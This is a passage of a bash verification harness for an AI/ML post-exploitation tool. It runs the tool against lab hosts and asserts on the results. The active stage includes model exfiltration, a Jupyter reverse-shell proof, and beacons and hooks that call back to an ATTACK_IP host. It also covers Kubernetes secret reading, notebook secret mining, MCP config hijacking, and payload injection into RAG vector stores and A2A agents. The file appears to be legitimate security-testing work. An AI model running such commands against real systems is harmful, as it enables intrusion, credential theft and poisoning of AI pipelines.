    run_capture "wandb-runs" "$TMPDIR/wandb-runs.json" "$TMPDIR/wandb-runs.stderr" \
        "$AIPOSTEX" wandb --target "$TARGET_ML:8444" runs --entity acme-ml-team --project churn-prediction --format json

    run_capture "wandb-artifacts" "$TMPDIR/wandb-artifacts.json" "$TMPDIR/wandb-artifacts.stderr" \
        "$AIPOSTEX" wandb --target "$TARGET_ML:8444" artifacts --entity acme-ml-team --project churn-prediction --format json

    # Kubeflow Pipelines — :9000 serves both v1beta1+v2beta1 (legacy compat),
    # :9001 serves ONLY v2beta1 (modern KFP 2.x cluster shape).
    run_capture "kubeflow-enum" "$TMPDIR/kubeflow-enum.json" "$TMPDIR/kubeflow-enum.stderr" \
        "$AIPOSTEX" kubeflow --target "$TARGET_ML:9000" enum --format json

    run_capture "kubeflow-pipelines" "$TMPDIR/kubeflow-pipelines.json" "$TMPDIR/kubeflow-pipelines.stderr" \
        "$AIPOSTEX" kubeflow --target "$TARGET_ML:9000" pipelines --format json

    run_capture "kubeflow-runs" "$TMPDIR/kubeflow-runs.json" "$TMPDIR/kubeflow-runs.stderr" \
        "$AIPOSTEX" kubeflow --target "$TARGET_ML:9000" runs --format json

    run_capture "kubeflow-v2-enum" "$TMPDIR/kubeflow-v2-enum.json" "$TMPDIR/kubeflow-v2-enum.stderr" \
        "$AIPOSTEX" kubeflow --target "$TARGET_ML:9001" enum --format json

    run_capture "kubeflow-v2-pipelines" "$TMPDIR/kubeflow-v2-pipelines.json" "$TMPDIR/kubeflow-v2-pipelines.stderr" \
        "$AIPOSTEX" kubeflow --target "$TARGET_ML:9001" pipelines --format json

    # A2A (agent on ailab-app :8100)
    run_capture "a2a-enum" "$TMPDIR/a2a-enum.json" "$TMPDIR/a2a-enum.stderr" \
        "$AIPOSTEX" a2a --target "$TARGET_APP:8100" enum --format json

    run_capture "a2a-tasks" "$TMPDIR/a2a-tasks.json" "$TMPDIR/a2a-tasks.stderr" \
        "$AIPOSTEX" a2a --target "$TARGET_APP:8101" task-status \
        --task-id task-acme-procurement-0001 --format json

    # k8s (kube-apiserver on ailab-k8s :6443, TLS self-signed -> --insecure; read-only verbs)
    run_capture "k8s-enum" "$TMPDIR/k8s-enum.json" "$TMPDIR/k8s-enum.stderr" \
        "$AIPOSTEX" k8s --target "$TARGET_K8S:6443" --insecure enum --format json

    run_capture "k8s-rbac-probe" "$TMPDIR/k8s-rbac-probe.json" "$TMPDIR/k8s-rbac-probe.stderr" \
        "$AIPOSTEX" k8s --target "$TARGET_K8S:6443" --insecure rbac-probe --format json

    run_capture "templates-list" "$TMPDIR/templates-list.txt" "$TMPDIR/templates-list.stderr" \
        "$AIPOSTEX" templates list

    local template_id
    template_id=$(grep -oE '[a-z]+-[a-z]+-[0-9]+-[a-z0-9-]+' "$TMPDIR/templates-list.txt" 2>/dev/null | head -1)
    if [[ -n "$template_id" ]]; then
        run_capture "templates-info" "$TMPDIR/templates-info.txt" "$TMPDIR/templates-info.stderr" \
            "$AIPOSTEX" templates info "$template_id"
    fi

    run_capture "chromadb-enum" "$TMPDIR/chromadb-enum.json" "$TMPDIR/chromadb-enum.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" enum --format json

    run_capture "weaviate-enum" "$TMPDIR/weaviate-enum.json" "$TMPDIR/weaviate-enum.stderr" \
        "$AIPOSTEX" vectordb --type weaviate --target "$TARGET_DS:8080" enum --format json

    run_capture "qdrant-enum" "$TMPDIR/qdrant-enum.json" "$TMPDIR/qdrant-enum.stderr" \
        "$AIPOSTEX" vectordb --type qdrant --target "$TARGET_DS:6333" enum --format json

    run_capture "chromadb-extract" "$TMPDIR/chromadb-extract.json" "$TMPDIR/chromadb-extract.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" \
        extract --collection acme-knowledge-base --limit 200 --format json

    run_capture "chromadb-extract-codedocs" "$TMPDIR/chromadb-extract-codedocs.json" "$TMPDIR/chromadb-extract-codedocs.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" \
        extract --collection code-documentation --limit 200 --format json

    run_capture "chromadb-extract-tickets" "$TMPDIR/chromadb-extract-tickets.json" "$TMPDIR/chromadb-extract-tickets.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" \
        extract --collection support-tickets-2025 --limit 200 --format json

    run_capture "weaviate-extract" "$TMPDIR/weaviate-extract.json" "$TMPDIR/weaviate-extract.stderr" \
        "$AIPOSTEX" vectordb --type weaviate --target "$TARGET_DS:8080" \
        extract --collection ResearchDocument --limit 200 --format json

    run_capture "qdrant-extract" "$TMPDIR/qdrant-extract.json" "$TMPDIR/qdrant-extract.stderr" \
        "$AIPOSTEX" vectordb --type qdrant --target "$TARGET_DS:6333" \
        extract --collection security-findings --limit 200 --format json

    run_capture "chromadb-search-sensitive" "$TMPDIR/chromadb-search-sensitive.json" "$TMPDIR/chromadb-search-sensitive.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" \
        search-sensitive --limit 200 --format json

    run_capture "weaviate-search-sensitive" "$TMPDIR/weaviate-search-sensitive.json" "$TMPDIR/weaviate-search-sensitive.stderr" \
        "$AIPOSTEX" vectordb --type weaviate --target "$TARGET_DS:8080" \
        search-sensitive --collection ResearchDocument --limit 200 --format json

    run_capture "weaviate-search-teamcomm" "$TMPDIR/weaviate-search-teamcomm.json" "$TMPDIR/weaviate-search-teamcomm.stderr" \
        "$AIPOSTEX" vectordb --type weaviate --target "$TARGET_DS:8080" \
        search-sensitive --collection TeamCommunication --limit 200 --format json

    run_capture "qdrant-search-sensitive" "$TMPDIR/qdrant-search-sensitive.json" "$TMPDIR/qdrant-search-sensitive.stderr" \
        "$AIPOSTEX" vectordb --type qdrant --target "$TARGET_DS:6333" \
        search-sensitive --collection security-findings --limit 200 --format json

    run_capture "qdrant-search-catalog" "$TMPDIR/qdrant-search-catalog.json" "$TMPDIR/qdrant-search-catalog.stderr" \
        "$AIPOSTEX" vectordb --type qdrant --target "$TARGET_DS:6333" \
        search-sensitive --collection product-catalog --limit 200 --format json

    run_capture "jupyter-enum" "$TMPDIR/jupyter-enum.json" "$TMPDIR/jupyter-enum.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" enum --format json

    run_capture "jupyter-ds-enum" "$TMPDIR/jupyter-ds-enum.json" "$TMPDIR/jupyter-ds-enum.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DS:8889" enum --format json

    run_capture "jupyter-notebooks" "$TMPDIR/jupyter-notebooks.json" "$TMPDIR/jupyter-notebooks.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" notebooks --format json

    run_capture "jupyter-notebooks-secrets" "$TMPDIR/jupyter-notebooks-secrets.json" "$TMPDIR/jupyter-notebooks-secrets.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" notebooks --mine-secrets --format json

    run_capture "jupyter-read-notebook" "$TMPDIR/jupyter-read-notebook.json" "$TMPDIR/jupyter-read-notebook.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" read-notebook \
        --path notebooks/rag-prototype.ipynb --format json

    run_capture "jupyter-read-notebook-churn" "$TMPDIR/jupyter-read-notebook-churn.json" "$TMPDIR/jupyter-read-notebook-churn.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DS:8889" read-notebook \
        --path notebooks/churn-model-features.ipynb --format json

    run_capture "jupyter-kernels" "$TMPDIR/jupyter-kernels.json" "$TMPDIR/jupyter-kernels.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" kernels --format json

    if ssh $SSH_OPTS "labadmin@$(inventory_host_ip "ailab-dev")" test -x ~/aipostex 2>/dev/null; then
        ssh $SSH_OPTS "labadmin@$(inventory_host_ip "ailab-dev")" 'sudo $HOME/aipostex discover files --path /home/devuser/ --format json' \
            > "$TMPDIR/scan-files-devuser.json" 2> "$TMPDIR/scan-files-devuser.stderr" || true
    fi
}

prepare_active_artifacts() {
    run_capture "scan-network-full" "$TMPDIR/scan-network-full.json" "$TMPDIR/scan-network-full.stderr" \
        "$AIPOSTEX" discover network \
        --target "$TARGETS_CSV" \
        --ports "$SCAN_PORTS" \
        --mode full \
        --format json

    # POST request is exploit-gated (--force-exploit) so it belongs in the active stage, not read-only.
    run_capture "request-mlflow-search" "$TMPDIR/request-mlflow-search.json" "$TMPDIR/request-mlflow-search.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" request POST /api/2.0/mlflow/experiments/search \
        --body '{"max_results": 1}' --force-exploit --format json

    run_capture "gradio-queue-probe" "$TMPDIR/gradio-queue-probe.json" "$TMPDIR/gradio-queue-probe.stderr" \
        "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" queue-probe \
        --api-name predict_text --input-json '["lab-verify"]' --force-exploit --format json

    run_capture "gradio-predict" "$TMPDIR/gradio-predict.json" "$TMPDIR/gradio-predict.stderr" \
        "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" predict \
        --api-name export_bundle \
        --input-json '["incident-response runbook"]' \
        --format json
    GRADIO_FILE_REF=$(grep -Eo '/tmp/gradio-lab/exports/[A-Za-z0-9._/-]+' "$TMPDIR/gradio-predict.json" | head -1)

    if [[ -n "$GRADIO_FILE_REF" ]]; then
        run_capture "gradio-file-chain" "$TMPDIR/gradio-file-chain.json" "$TMPDIR/gradio-file-chain.stderr" \
            "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" file-chain --file "$GRADIO_FILE_REF" --format json

        run_capture "gradio-download" "$TMPDIR/gradio-download.json" "$TMPDIR/gradio-download.stderr" \
            "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" download-file \
            --file "$GRADIO_FILE_REF" --format json
    fi

    run_capture "gradio-upload" "$TMPDIR/gradio-upload.json" "$TMPDIR/gradio-upload.stderr" \
        "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" upload-file \
        --force-exploit --format json

    run_capture "ollama-exfiltrate" "$TMPDIR/ollama-exfiltrate.json" "$TMPDIR/ollama-exfiltrate.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" exfiltrate \
        --model smollm2:135m --max-bytes 8192 --per-layer-bytes 4096 \
        --force-exploit --format json

    run_capture "jupyter-start-kernel" "$TMPDIR/jupyter-start-kernel.json" "$TMPDIR/jupyter-start-kernel.stderr" \
        "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" start-kernel --force-exploit --format json
    JUPYTER_KERNEL_ID=$(extract_jq_first '.findings[]? | .metadata.kernel_id? // empty' "$TMPDIR/jupyter-start-kernel.json")

    if [[ -n "$JUPYTER_KERNEL_ID" && "$JUPYTER_KERNEL_ID" != "null" ]]; then
        run_capture "jupyter-reverse-shell-proof" "$TMPDIR/jupyter-reverse-shell-proof.json" "$TMPDIR/jupyter-reverse-shell-proof.stderr" \
            "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" reverse-shell-proof \
            --kernel "$JUPYTER_KERNEL_ID" --force-exploit --format json
    fi

    if [[ -n "$JUPYTER_KERNEL_ID" && "$JUPYTER_KERNEL_ID" != "null" ]]; then
        run_capture "jupyter-pip-proof" "$TMPDIR/jupyter-pip-proof.json" "$TMPDIR/jupyter-pip-proof.stderr" \
            "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" pip-proof \
            --kernel "$JUPYTER_KERNEL_ID" --force-exploit --format json
    fi

    run_capture "ray-pip-inject" "$TMPDIR/ray-pip-inject.json" "$TMPDIR/ray-pip-inject.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" pip-inject --force-exploit --format json

    run_capture "ray-cluster-info" "$TMPDIR/ray-cluster-info.json" "$TMPDIR/ray-cluster-info.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" cluster-info --force-exploit --format json

    run_capture "ray-beacon" "$TMPDIR/ray-beacon.json" "$TMPDIR/ray-beacon.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" beacon \
        --callback-url "http://${ATTACK_IP}:18444/ray-beacon" \
        --interval 120 --force-exploit --format json

    run_capture "mlflow-tamper-proof" "$TMPDIR/mlflow-tamper-proof.json" "$TMPDIR/mlflow-tamper-proof.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" tamper-proof --force-exploit --format json

    # WS-B: write an artifact to the proxied-artifact store (--serve-artifacts) and read
    # it back — a confirmed unauthenticated WRITE (impact/influenced), never execution.
    run_capture "mlflow-upload-artifact" "$TMPDIR/mlflow-upload-artifact.json" "$TMPDIR/mlflow-upload-artifact.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" upload-artifact \
        --artifact-path aipostex-verify/poisoned-artifact.txt \
        --force-exploit --format json

    run_capture "mlflow-hook" "$TMPDIR/mlflow-hook.json" "$TMPDIR/mlflow-hook.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" hook \
        --model acme-churn-ensemble --version 1 \
        --callback-url "http://${ATTACK_IP}:18443/mlflow-hook" \
        --force-exploit --format json

    run_capture "mlflow-bulk-download" "$TMPDIR/mlflow-bulk-download.json" "$TMPDIR/mlflow-bulk-download.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" bulk-download \
        --model acme-churn-ensemble --version 1 --path-prefix model \
        --max-files 2 --max-bytes 4096 --per-file-bytes 2048 \
        --force-exploit --format json

    run_capture "oai-throughput" "$TMPDIR/oai-throughput.json" "$TMPDIR/oai-throughput.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" throughput \
        --model local-smollm --requests 3 --concurrency 1 --force-exploit --format json

    run_capture "oai-proxy-test" "$TMPDIR/oai-proxy-test.json" "$TMPDIR/oai-proxy-test.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" proxy-test \
        --model local-smollm --force-exploit --format json

    run_capture "mcp-chain" "$TMPDIR/mcp-chain.json" "$TMPDIR/mcp-chain.stderr" \
        "$AIPOSTEX" mcp --target "$TARGET_DEV:3000" chain \
        --skip-metadata --force-exploit --format json

    run_capture "mcp-shell" "$TMPDIR/mcp-shell.out" "$TMPDIR/mcp-shell.stderr" \
        bash -c 'printf "%s\n" ":tools" "get_environment {}" ":quit" | "$1" mcp --target "$2" shell --force-exploit --output "$3"' \
        _ "$AIPOSTEX" "$TARGET_DEV:3000" "$TMPDIR/mcp-shell.jsonl"

    run_capture "oai-shell-runaway" "$TMPDIR/oai-shell-runaway.out" "$TMPDIR/oai-shell-runaway.stderr" \
        bash -c 'printf "%s\n" "runaway-trim-check" ":quit" | "$1" openai-compat --target "$2" shell --model vllm-lab-model --max-tokens 32 --output "$3"' \
        _ "$AIPOSTEX" "$TARGET_ML:8182" "$TMPDIR/oai-shell-runaway.jsonl"

    cp "$MCP_FIXTURES/claude_desktop_config.json" "$TMPDIR/mcp-config-hijack.json" 2>/dev/null || true
    run_capture "mcp-config-hijack" "$TMPDIR/mcp-config-hijack-out.json" "$TMPDIR/mcp-config-hijack-out.stderr" \
        "$AIPOSTEX" mcp config-hijack \
        --config "$TMPDIR/mcp-config-hijack.json" \
        --server aipostex-hijack-verify \
        --url "$TARGET_DEV:3000/mcp" \
        --force-exploit --format json

    run_capture "hf-model-download" "$TMPDIR/hf-model-download.json" "$TMPDIR/hf-model-download.stderr" \
        "$AIPOSTEX" huggingface --target "$TARGET_APP:8180" model-download \
        --hub-base "$TARGET_APP:8180" \
        --max-files 5 --max-bytes 4096 --per-file-bytes 1024 \
        --force-exploit --format json

    # WS-A: the gated Hub repo (acme-tgi-gated) mirrors a private/gated model — resolving
    # files 401s without the harvested HF token (honest recon/reachable), and the client's
    # --hub-header credential path lands the weights (takeover-capable) with it.
    run_capture "hf-model-download-gated-noauth" "$TMPDIR/hf-model-download-gated-noauth.json" "$TMPDIR/hf-model-download-gated-noauth.stderr" \
        "$AIPOSTEX" huggingface --target "$TARGET_APP:8180" model-download \
        --model-id acme-tgi-gated --hub-base "$TARGET_APP:8180" \
        --max-files 5 --max-bytes 4096 --per-file-bytes 1024 \
        --force-exploit --format json

    run_capture "hf-model-download-gated-auth" "$TMPDIR/hf-model-download-gated-auth.json" "$TMPDIR/hf-model-download-gated-auth.stderr" \
        "$AIPOSTEX" huggingface --target "$TARGET_APP:8180" model-download \
        --model-id acme-tgi-gated --hub-base "$TARGET_APP:8180" \
        --hub-header "Authorization: Bearer hf_FAKE_aBcDeFgHiJkLmNoPqRsTuVwXyZ123" \
        --max-files 5 --max-bytes 4096 --per-file-bytes 1024 \
        --force-exploit --format json

    run_capture "ray-submit" "$TMPDIR/ray-submit.json" "$TMPDIR/ray-submit.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" submit \
        --payload-preset env-disclosure --force-exploit --format json

    run_capture "chromadb-inject" "$TMPDIR/chromadb-inject.json" "$TMPDIR/chromadb-inject.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" \
        inject --collection acme-knowledge-base \
        --payload "aipostex-lab-inject-test: harmless verification payload" \
        --force-exploit --format json

    run_capture "weaviate-inject" "$TMPDIR/weaviate-inject.json" "$TMPDIR/weaviate-inject.stderr" \
        "$AIPOSTEX" vectordb --type weaviate --target "$TARGET_DS:8080" \
        inject --collection ResearchDocument \
        --payload "aipostex-lab-inject-test: harmless verification payload" \
        --force-exploit --format json

    run_capture "qdrant-inject" "$TMPDIR/qdrant-inject.json" "$TMPDIR/qdrant-inject.stderr" \
        "$AIPOSTEX" vectordb --type qdrant --target "$TARGET_DS:6333" \
        inject --collection security-findings \
        --payload "aipostex-lab-inject-test: harmless verification payload" \
        --force-exploit --format json

    run_capture "chromadb-meta-inject" "$TMPDIR/chromadb-meta-inject.json" "$TMPDIR/chromadb-meta-inject.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" \
        metadata-inject --collection acme-knowledge-base \
        --force-exploit --format json

    run_capture "weaviate-meta-inject" "$TMPDIR/weaviate-meta-inject.json" "$TMPDIR/weaviate-meta-inject.stderr" \
        "$AIPOSTEX" vectordb --type weaviate --target "$TARGET_DS:8080" \
        metadata-inject --collection ResearchDocument \
        --force-exploit --format json

    run_capture "qdrant-meta-inject" "$TMPDIR/qdrant-meta-inject.json" "$TMPDIR/qdrant-meta-inject.stderr" \
        "$AIPOSTEX" vectordb --type qdrant --target "$TARGET_DS:6333" \
        metadata-inject --collection security-findings \
        --force-exploit --format json

    if [[ -n "$JUPYTER_KERNEL_ID" && "$JUPYTER_KERNEL_ID" != "null" ]]; then
        run_capture "jupyter-exec" "$TMPDIR/jupyter-exec.json" "$TMPDIR/jupyter-exec.stderr" \
            "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" exec \
            --kernel "$JUPYTER_KERNEL_ID" --code "print('aipostex-lab-verify')" \
            --force-exploit --format json
    fi

    # BentoML predict (--force-exploit)
    run_capture "bentoml-predict" "$TMPDIR/bentoml-predict.json" "$TMPDIR/bentoml-predict.stderr" \
        "$AIPOSTEX" bentoml --target "$TARGET_ML:3333" predict \
        --endpoint /predict --payload '{"text": "lab verify test"}' \
        --force-exploit --format json

    # TorchServe predict (--force-exploit)
    run_capture "torchserve-predict" "$TMPDIR/torchserve-predict.json" "$TMPDIR/torchserve-predict.stderr" \
        "$AIPOSTEX" torchserve --target "$TARGET_ML:8081" predict \
        --model acme-sentiment --payload '{"text": "lab verify test"}' \
        --force-exploit --format json

    # TorchServe register + handler execution verification (--force-exploit).
    # --model-url points at a real fetchable .mar-shaped artifact (inference port
    # /artifacts/*), NOT the management /models JSON — the server must actually
    # fetch it to mark the model READY, and the tool's inference reality probe then
    # confirms the handler is input-dependent before claiming execution-confirmed.
    run_capture "torchserve-register-handler" "$TMPDIR/torchserve-register-handler.json" "$TMPDIR/torchserve-register-handler.stderr" \
        "$AIPOSTEX" torchserve --target "$TARGET_ML:8081" register \
        --model-url "$TARGET_ML:8080/artifacts/aipostex-handler.mar" --model aipostex-handler-verify \
        --payload '{"text": "handler verify"}' \
        --force-exploit --format json

    # Triton infer (--force-exploit)
    run_capture "triton-infer" "$TMPDIR/triton-infer.json" "$TMPDIR/triton-infer.stderr" \
        "$AIPOSTEX" triton --target "$TARGET_ML:8500" infer \
        --model acme-fraud-detector --payload '{"inputs": [{"name": "input__0", "datatype": "FP32", "shape": [1, 128], "data": [0.0]}]}' \
        --force-exploit --format json

    # Triton model-load + post-load inference verification (--force-exploit)
    run_capture "triton-model-load-verify" "$TMPDIR/triton-model-load-verify.json" "$TMPDIR/triton-model-load-verify.stderr" \
        "$AIPOSTEX" triton --target "$TARGET_ML:8500" model-load \
        --model aipostex-injected \
        --payload '{"inputs": [{"name": "INPUT0", "datatype": "FP32", "shape": [1, 1], "data": [1.0]}]}' \
        --force-exploit --format json

    # TF Serving predict with input-dependent inference verification (--force-exploit)
    run_capture "tfserving-predict" "$TMPDIR/tfserving-predict.json" "$TMPDIR/tfserving-predict.stderr" \
        "$AIPOSTEX" tfserving --target "$TARGET_ML:8501" predict \
        --model acme-fraud-scorer \
        --payload '{"instances": [[0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,1.9,2.0,2.1,2.2,2.3,2.4,2.5,2.6,2.7,2.8,2.9,3.0,3.1,3.2]]}' \
        --force-exploit --format json

    # W&B secrets (--force-exploit)
    run_capture "wandb-secrets" "$TMPDIR/wandb-secrets.json" "$TMPDIR/wandb-secrets.stderr" \
        "$AIPOSTEX" wandb --target "$TARGET_ML:8444" secrets \
        --entity acme-ml-team --project churn-prediction --force-exploit --format json

    # VectorDB RAG verify (--force-exploit)
    run_capture "chromadb-rag-verify" "$TMPDIR/chromadb-rag-verify.json" "$TMPDIR/chromadb-rag-verify.stderr" \
        "$AIPOSTEX" vectordb --type chromadb --target "$TARGET_ML:8000" \
        rag-verify --collection acme-knowledge-base \
        --llm-target "$TARGET_ML:4000" --llm-model local-smollm \
        --force-exploit --format json

    # A2A tool-inject (--force-exploit)
    run_capture "a2a-tool-inject" "$TMPDIR/a2a-tool-inject.json" "$TMPDIR/a2a-tool-inject.stderr" \
        "$AIPOSTEX" a2a --target "$TARGET_APP:8100" tool-inject \
        --tool lookup_policy --args '{"policy_id":"acme-lab-verification"}' \
        --force-exploit --format json

    # A2A replay (--force-exploit)
    run_capture "a2a-replay" "$TMPDIR/a2a-replay.json" "$TMPDIR/a2a-replay.stderr" \
        "$AIPOSTEX" a2a --target "$TARGET_APP:8100" replay \
        --message "summarize the acme lab verification policy" \
        --original-task-id task-acme-procurement-0001 \
        --force-exploit --format json

    run_capture "k8s-sa-loot-dossier-source" "$TMPDIR/k8s-sa-loot-dossier-source.jsonl" "$TMPDIR/k8s-sa-loot-dossier-source.stderr" \
        "$AIPOSTEX" k8s --target "$TARGET_K8S:6443" --insecure sa-loot \
        --namespace ml-prod --force-exploit --format jsonl

    # WS2 Tier-2: the anon-open k3s grants system:anonymous cluster-wide secrets:get,list,
    # so --all-namespaces reads the planted ml-prod/ml-system secrets as a credential READ
    # (impact/read-confirmed), never ownership. Gated verb — active-layer only.
    run_capture "k8s-secret-read" "$TMPDIR/k8s-secret-read.json" "$TMPDIR/k8s-secret-read.stderr" \
        "$AIPOSTEX" k8s --target "$TARGET_K8S:6443" --insecure secret-read --all-namespaces --force-exploit --format json

    rm -rf "$TMPDIR/dossier-manual"
    run_capture "dossier-manual" "$TMPDIR/dossier-manual.out" "$TMPDIR/dossier-manual.stderr" \
        "$AIPOSTEX" report view "$TMPDIR/k8s-sa-loot-dossier-source.jsonl" \
        --dossier-dir "$TMPDIR/dossier-manual"

    # Session export
    run_capture "session-start" "$TMPDIR/session-start.txt" "$TMPDIR/session-start.stderr" \
        "$AIPOSTEX" sessions start --name aipostex-verify --force

    run_capture "session-export" "$TMPDIR/session-export.json" "$TMPDIR/session-export.stderr" \
        "$AIPOSTEX" sessions export --findings-file "$TMPDIR/scan-network.json" --format json

    run_capture "session-stop" "$TMPDIR/session-stop.txt" "$TMPDIR/session-stop.stderr" \
        "$AIPOSTEX" sessions stop
}

run_operator_layer() {
    section "operator"
    prepare_read_only_artifacts

    # ── scan-network ──
    if assert_artifact_ok "scan-network" "$TMPDIR/scan-network.json"; then
        assert_contains "scan-network discovers Ollama" "ollama" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers Gradio" "gradio" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers MLflow" "mlflow" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers Ray" "ray" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers LangServe" "langserve" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers Streamlit" "streamlit" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers HF TGI" "hf-tgi" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers HF TEI" "hf-tei" "$TMPDIR/scan-network.json"
        assert_contains "scan-network discovers vLLM" "vllm" "$TMPDIR/scan-network.json"
        # Next-steps are folded into the JSON findings (per-host next-step objects
        # with command/gated/priority/stage), not printed to stderr; the full
        # catalog is verbose-only.
        assert_contains "scan-network folds next-step recommendations into findings" '"gated"' "$TMPDIR/scan-network.json"
        assert_contains "scan-network suggests auth-sweep" "auth-sweep" "$TMPDIR/scan-network.json"
        assert_contains "scan-network suggests litellm-probe" "litellm-probe" "$TMPDIR/scan-network.json"
        assert_contains "scan-network fires litellm-config template" "litellm-config" "$TMPDIR/scan-network.json"
        assert_not_contains "scan-network detect skips exploit templates" "mcp-cmdi-001" "$TMPDIR/scan-network.json"
    fi

    # ── assess network (optional when AIPOSTEX_SKIP_ASSESS=1) ──
    if [[ "${AIPOSTEX_SKIP_ASSESS:-}" == "1" ]]; then
        skip "assess network skipped (AIPOSTEX_SKIP_ASSESS=1)"
    elif [[ -f "$TMPDIR/assess-network.json" ]]; then
        assert_jq "assess network includes workflow metadata" '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/assess-network.json"
        assert_contains "assess network discovers Ollama" "ollama" "$TMPDIR/assess-network.json"
    else
        fail "assess network artifact missing (expected $TMPDIR/assess-network.json)"
    fi

    # ── scan targets ──
    if assert_artifact_ok "scan-targets-ollama" "$TMPDIR/scan-targets-ollama.json"; then
        assert_jq "scan targets ollama returns findings" '.findings[]?' "$TMPDIR/scan-targets-ollama.json"
        assert_contains "scan targets ollama hits ollama templates" "ollama" "$TMPDIR/scan-targets-ollama.json"
    fi
    if assert_artifact_ok "request-top-ray-jobs" "$TMPDIR/request-top-ray-jobs.json"; then
        assert_jq "request primitive returns findings" '.findings[]?' "$TMPDIR/request-top-ray-jobs.json"
        assert_jq "request primitive lands as access/read-confirmed on 2xx" \
            '.findings[]? | select(.metadata.module == "request" and .metadata.action == "request" and .metadata.response_status == 200 and .metadata.stage == "access" and .metadata.landed == "read-confirmed")' \
            "$TMPDIR/request-top-ray-jobs.json"
    fi

    # ── scan-files ──
    if [[ -f "$TMPDIR/scan-files.json" ]]; then
        assert_contains "scan-files finds GitHub PAT" "ghp_FAKE" "$TMPDIR/scan-files.json"
        assert_contains "scan-files finds Brave key" "BSA_FAKE" "$TMPDIR/scan-files.json"
        assert_contains "scan-files sees remote MCP fixture" "remote_mcp_chain.json" "$TMPDIR/scan-files.json"
    else
        skip "scan-files skipped because MCP fixtures were unavailable"
    fi

    # ── mcp ──
    if [[ -f "$TMPDIR/mcp-analyze.json" ]]; then
        assert_contains "mcp analyze sees remote URL" "$(inventory_host_ip "ailab-dev"):3000/message" "$TMPDIR/mcp-analyze.json"
        assert_contains "mcp analyze preserves inspector hint" "INSPECTOR_URL" "$TMPDIR/mcp-analyze.json"
        assert_jq "mcp analyze includes workflow metadata" '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/mcp-analyze.json"
    else
        skip "mcp analyze skipped because remote MCP fixture was unavailable"
    fi

    if assert_artifact_ok "mcp-enum" "$TMPDIR/mcp-enum.json"; then
        assert_contains "mcp enum lists execute_command" "execute_command" "$TMPDIR/mcp-enum.json"
        assert_contains "mcp enum lists fetch_url" "fetch_url" "$TMPDIR/mcp-enum.json"
        assert_jq "mcp enum has stage" '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/mcp-enum.json"
    fi
    if [[ -f "$TMPDIR/mcp-stdio-enum.json" ]]; then
        assert_contains "mcp stdio enum lists read_lab_note" "read_lab_note" "$TMPDIR/mcp-stdio-enum.json"
        assert_contains "mcp stdio enum lists list_services" "list_services" "$TMPDIR/mcp-stdio-enum.json"
    else
        skip "mcp stdio enum skipped because stdio fixture was unavailable"
    fi

    # ── openai-compat ──
    if assert_artifact_ok "oai-auth-sweep" "$TMPDIR/oai-auth-sweep.json"; then
        assert_contains "openai auth-sweep reports acceptance class" "acceptance_class" "$TMPDIR/oai-auth-sweep.json"
        assert_regex "openai auth-sweep is not empty" '(inventory-only|inference-capable|rejected)' "$TMPDIR/oai-auth-sweep.json"
    fi
    if assert_artifact_ok "oai-enum" "$TMPDIR/oai-enum.json"; then
        assert_contains "openai enum lists local-smollm" "local-smollm" "$TMPDIR/oai-enum.json"
    fi
    if assert_artifact_ok "oai-validate" "$TMPDIR/oai-validate.json"; then
        assert_jq "openai validate includes coherence score" '.findings[]? | select(.metadata.coherence_score != null)' "$TMPDIR/oai-validate.json"
    fi

    # ── litellm-probe ──
    if assert_artifact_ok "litellm-probe" "$TMPDIR/litellm-probe.json"; then
        assert_jq "litellm-probe returns findings" '.findings | length >= 2' "$TMPDIR/litellm-probe.json"
        assert_regex "litellm-probe exposes api_base" 'api_base|api.openai.com' "$TMPDIR/litellm-probe.json"
